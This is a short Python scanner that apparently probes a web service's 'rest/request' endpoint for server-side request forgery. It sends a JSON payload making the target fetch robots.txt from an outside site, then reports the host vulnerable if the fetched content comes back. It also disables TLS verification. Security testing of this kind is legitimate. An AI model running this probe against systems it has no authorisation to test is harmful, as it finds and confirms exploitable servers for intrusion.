import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"rest/request"
	body='{"method":"GET","data":"","path":"robots.txt","host":"https://www.baidu.com"}'
	headers={'content-type': 'application/json'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if "Disallow" in response.text and "baidu" in response.text and response.status_code == 200 and "Unrecognized token" in response.text and "{\"status\":500" in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
